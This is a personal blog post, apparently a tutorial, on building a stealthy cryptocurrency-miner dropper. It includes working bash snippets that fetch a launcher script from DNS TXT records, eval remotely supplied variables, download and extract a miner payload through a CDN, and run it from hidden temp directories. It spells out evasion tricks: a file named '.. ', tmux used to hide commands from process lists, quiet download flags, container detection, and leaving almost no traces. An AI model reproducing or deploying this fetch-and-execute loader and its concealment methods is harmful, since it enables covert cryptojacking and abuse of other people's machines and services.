<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"lang=en><meta charset=UTF-8><meta content=width=device-width,initial-scale=1 name=viewport><link href=https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper rel=canonical><link title="untoreh's site"href=https://www.unto.re/feed.xml rel=alternate type=application/rss+xml><link href=https://www.unto.re/amp/posts/chronichles_of_a_cryptonote_dropper rel=amphtml><meta content="Chronicles of a cryptonote dropper"property=og:title><meta content=article property=og:type><meta content=https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper property=og:url><meta content=https://www.unto.re/assets/appa.png property=og:image><meta content="...How far are you willing to go for...pennies?"property=og:description><meta content="untoreh's site"property=og:site_name><meta content=English property=og:locale><meta content=English property=og:locale:alternate><meta content=German property=og:locale:alternate><meta content=Italian property=og:locale:alternate><meta content="Mandarin Chinese"property=og:locale:alternate><meta content=Spanish property=og:locale:alternate><meta content=Hindi property=og:locale:alternate><meta content=Arabic property=og:locale:alternate><meta content=Portuguese property=og:locale:alternate><meta content=Bengali property=og:locale:alternate><meta content=Russian property=og:locale:alternate><meta content=Japanese property=og:locale:alternate><meta content=Punjabi property=og:locale:alternate><meta content=Javanese property=og:locale:alternate><meta content=Vietnamese property=og:locale:alternate><meta content=French property=og:locale:alternate><meta content=Urdu property=og:locale:alternate><meta content=Turkish property=og:locale:alternate><meta content=Polish property=og:locale:alternate><meta content=Ukranian property=og:locale:alternate><meta content=Dutch property=og:locale:alternate><meta content=Greek property=og:locale:alternate><meta content=Swedish property=og:locale:alternate><meta content=Zulu property=og:locale:alternate><meta content=Romanian property=og:locale:alternate><meta content=Malay property=og:locale:alternate><meta content=Korean property=og:locale:alternate><meta content=Thai property=og:locale:alternate><meta content=Filipino property=og:locale:alternate><meta content=summary name=twitter:card><meta content=@untoreh name=twitter:creator><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2021,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script id=ldj-webpage type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/libs/highlight/github.min.css rel=stylesheet><link href=/css/franklin.css rel=stylesheet><link href=/css/main.css rel=stylesheet><link href=/css/menu.css rel=stylesheet><link href=/css/pages.css rel=stylesheet><link href=/css/lunr.css rel=stylesheet><link href=/css/footer.css rel=stylesheet><link href=/css/responsive.css rel=stylesheet><link href=/css/animations.css rel=stylesheet><link href=/css/docco.css rel=stylesheet><link href=/css/flags-sprite.css rel=stylesheet><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title>Chronicles of a cryptonote dropper</title><meta content="...How far are you willing to go for...pennies?"name=description><script src=/libs/load.js></script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/></a><div class=author__wrap><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><ul><li class=author__avatar onclick=toggleTheme()><img alt=untoreh-light class=flip-front src=/assets/appa.png><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button title="Search Website"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/posts/><i class="fas fa-pen menu-icons"></i>posts</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/media/><i class="fas fa-tv menu-icons"></i>media</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div><button name="Website Menu"class=ham type=button><i class="fas fa-bars ham-icon"></i></button><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button title="Search Website"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/posts/><i class="fas fa-pen menu-icons"></i>posts</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/media/><i class="fas fa-tv menu-icons"></i>media</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div></nav></div></div></div><div><h1 id=title><a href=/posts/chronichles_of_a_cryptonote_dropper>Chronicles of a cryptonote dropper</a></h1><blockquote id=page-description style=font-style:italic>...How far are you willing to go for...pennies?</blockquote></div><div class=franklin-content><p>Assume you want to mine <a href=https://en.wikipedia.org/wiki/Cryptocurrency>cryptocurrencies</a> on remote <em>virtual</em> hardware. You need to find something to mine. Remote servers means, no <a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit>ASICS</a> or GPU proof of work algorithms, basically only <a href=\posts/a-few-notes-on-proof-of-work>CPU friendly coins</a>.<h2 id=the_software><a class=header-anchor href=#the_software>The software</a></h2><p>Search and find a <a href=https://github.com/xmrig/xmrig>miner</a>, but it is not really nice, you would like something you can better control from remote, so you find <a href=https://github.com/Bendr0id/xmrigCC>another miner</a>. You also want a <a href=https://github.com/Bendr0id/xmrigcc-proxy>proxy</a>, because many connections will be short lived, you don't want to <a href=https://en.wikipedia.org/wiki/Denial-of-service_attack>dos</a> your mining pool. Also a <a href=https://github.com/search?q=tunnel>tunnel</a> would be nice.<h2 id=the_design><a class=header-anchor href=#the_design>The design</a></h2><p>Some botnets use blockchains data to lookup commands, <a href=https://twitter.com/sarahjamielewis>somebody</a> also appears to have <a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968>lost bets</a> on this not happening again...anyway we are not that sophisticated, we will get by with some DNS records that store a script that pulls the payload which self extract in a temp directory executes and leaves <em>almost</em> no traces of its setup. Here is a small flow chart which depicts the structure</p><img src=/assets/posts/output/payload.png><h2 id=launcher><a class=header-anchor href=#launcher>Launcher</a></h2><p>The point of a startup script is to be accessible and easily updatable such that it withstands the test of time. Updating <a href=https://en.wikipedia.org/wiki/Domain_Name_System>DNS</a> records is easy, and DNS is the last thing that gets shutdown within a network..because IP addresses are hard to remember...so chances are it is going to be available most of the times. You see when we are <em>fetching the deployment script</em> we are actually already running some logic, this is the launcher script, it needs the ability to perform DNS queries to lookup our records, DNS might be ubiquitous but <a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/>dig</a> is not.<p>There is a little bit of a conundrum here, if we have to download another tool <em>to download another script to download the payload</em> we should just download the payload! In defense...doing this scripty dance adds to obfuscation, allows to keep only one implementation of the launcher (maintainability, yay), isn't required most of the times..so we also service a <a href=https://en.wikipedia.org/wiki/Standalone_program>statically linked</a> dig executable to perform dns queries, fetched either by self hosting, or cloud hosting (yes there are fallbacks, like 3 or 4, because cloud services have very minimal free bandwidth, and also require cookies or access tokens...they are very script unfriendly, purposefully so , of course).<p>What's in the dns records? We are using <a href=https://en.wikipedia.org/wiki/TXT_record>TXT</a> records, on a custom domain (fallbacks here too). Why TXT? they happen to be the ones that can store the largest amount of data..usually since it is kind of <a href=https://www.ietf.org/rfc/rfc6763.txt>recommended</a> depending on <em>things</em>. We are specifically using <a href=https://www.cloudflare.com/>cloudflare</a> for our DNS fiddling since it is free, and pretty much the only player in town (<em>well not really but any other alternative pales features wise</em>). It happens that you can store multiple pieces of data on the <em>same</em> record...this starts getting confusing and scramble for some specifications...(tangent) Cloudflare <a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size>used to</a> allow <em>chained</em> TXT records totaling ~9k bytes, docs now state ~2k bytes, prior to the change I was using ~6k I think, and was serving the script uncompressed, after that I had to thin out the script and compress it before hand (actually I tried to use a <a href=https://freedns.afraid.org/>freedns</a> provider, I was banned within one day, guessing they have a strict no-fat TXT records policy), however gzip compression appears to NOT be pipe friendly and was still causing problems, so I had to manage to cram the script in without compression (end tangent).<p>How do we store it? TXT records only support alphanumeric strings, no <a href=https://en.wikipedia.org/wiki/Null_character>NULs</a>, so we have to wrap it into a non null encoding, <a href=https://en.wikipedia.org/wiki/Base64>base64</a> satisfies this constraint, and because we are storing <em>chained</em> TXT records, we have to chunk the output, since we are using shell stuff, this is done through the <code>-w</code> flag, on busybox such flag used to be absent (or opt-in) on older versions which was annoying, an alternative is to use the encoder bundled with openssl, <code>openssl enc -base64</code>.<p>Now that we know how to store our deployment script we store it with either <a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md>cf cli</a> or manually. How do we pull it? We mentioned that we need bindutils or our own <code>dig</code>...after having chosen the serving endpoint, we want to download it, what is available is usually <a href=https://www.gnu.org/software/wget/>wget</a> or <a href=https://curl.se/>curl</a>, wget is found preinstalled much more often, however busybox only provides tls support with dynamic libraries, so you have to make sure the endpoint is serving http or your utility is <code>wget</code> from gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>It means try <code>-t2</code> times waiting <code>-T10</code> seconds being <code>-q</code> quiet reading from <code>-i-</code> stdin (<code>$digurl</code>) and writing to <code>-O-</code> stdout (<code>$filename</code>). This command does not reveal what we are downloading on a first glance. We are going to be very careful with other shell commands for the same reason, or sticking with shell (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29>bash</a>) built-ins where possible. Take also care about where you are downloading your executables, you want to ensure you can execute them, since some mount points, especially in containers and <code>tmp</code> paths are <code>noexec</code>. Now that we have our dns querying tool we fetch our records<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>Flags are self explanatory here, <code>+short</code> just means that we are only interested in the data itself, so that we don't have to parse the output. It's important to specify the DNS server, like google (<code>8.8.8.8</code>) or cloudflare (<code>1.1.1.1</code>) ones because many environments redirect or proxy dns queries to their own dns servers by default. After having fetched the chunked script we deal with quotes and whitespaces to make it ready for decoding<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span> <span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span> <span class=hljs-comment># remove whitespace</span>
<span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span> <span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span> <span class=hljs-comment># iterate over each line and remove the first characther</span>
<span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span> <span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span> <span class=hljs-comment># ensure joining didn't add whitespace</span>
<span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span> <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>What if now we <em>still</em> don't have our launcher? DNS is messy, we want a fallback, lets setup a subdomain to fetch the launcher script directly. Before evaluating our script we want to customize it, with some variables, again lets use a TXT record to store a NAME=VALUE list of variables and parse it. There is also a fallback for variables, cloudflare offers redirects based on URLs, these redirects are served <em>before</em> the destination, so we don't need an endpoint, we just want to configure regex based redirect rules to a fictitious endpoint, what we are interested in are the parameters of the url <code>?NAME=VALUE&NAME2=VALUE2...</code>, so that we can parametrize our launcher simply by changing the redirect url, always with attention to quoting and escapes codes<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span> <span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>The wget <code>-S</code> prints the redirect url we are interested in for parsing. Having the parameters and the script, we evaluate the variables writing them over a file<pre><code class="bash hljs"><span class=hljs-built_in>eval</span> <span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span>
<span class=hljs-built_in>echo</span> <span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>This file will be sourced by are deploy script. The last part of the startup script is to actual <a href=https://en.wikipedia.org/wiki/Trampoline_(computing)>trampoline</a>, evaluate the script within the current shell process, or maybe let it be managed by tmux if possible.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span>
<span class=hljs-built_in>eval</span> <span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span>
<span class=hljs-built_in>echo</span> <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>The launcher script is dumped to a file named ".. " this looks confusing because it can be mistaken as a <em>parent</em> directory. And we don't include the session command, as that would linger in the process command, instead we start the tmux session beforehand and send the source command through tmux terminal interface. Related to this, sometimes calling an executable with <code>./</code> keeps those chars in the command, so it is better to add the <code>$PWD</code> to the path..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload>The Payload</a></h2><p>Our deploy script starts by sourcing the <code>env.sh</code> file, and keeping or configured vars as <code>STARTING_*</code> vars like<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>This allows us to kill and restart a running instance while resetting the environment. Lets switch to a tmp directory with exec capabilities<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span> <span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span>
<span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span>
<span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span> <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>Checking if within a <a href=https://en.wikipedia.org/wiki/OS-level_virtualization>container</a> is also handy, we can probe the filesystem for hints<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span> <span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>Now it's time to download our payload, we choose to support both wget and curl, we already know how to use wget with careful flags, for curl it is a little bit different. We have to create a config file, and override <code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span> <span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>Last step is just to extract the payload<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>It is worth mentioning the use of a [CDN] for servicing the payload. Here again cloudflare to the rescue saves us from bandwidth expenditures. By simply renaming our compressed payload with a <em>file extension</em> supported by cloudflare...it becomes cached. Cloudflare doesn't check the headers of what it is servicing, maybe because doing so at that scale is simply impractical.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland>Adventures down Bashland</a></h2><p>Bash was chosen with the assumption that is portable, doesn't look too out of place and is more ubiquitous compared to other scripting languages such perl, ruby or python. The truth is that a standalone binary written in golang or lua would have been much easier, with less bugs, and easier to maintain, basically bash was the worst choice possible, in my defense, by the time that I scratched so many itches with bash, it was too late for a rewrite, and it was also getting kind of boring.<p>There was also the option to use busybox with the compile time flag to use all builtins (like grep and sed), however using builtins this way doesn't allow to spawn jobs (fork) and exposes the daemon to potential deadlocks.<p>I will describe some bash functions here, with the full list available <a href=\assets/posts/bash_functions.txt>here</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span>
<span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span>
        <span class=hljs-built_in>printf</span> <span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>Use the <code>RANDOM</code> variable to get a number between 97-122 corresponding to a character code, printf should be a builtin, we don't want to fork within a loop.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span>
<span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span> <span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span>
    <span class=hljs-built_in>eval</span> <span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
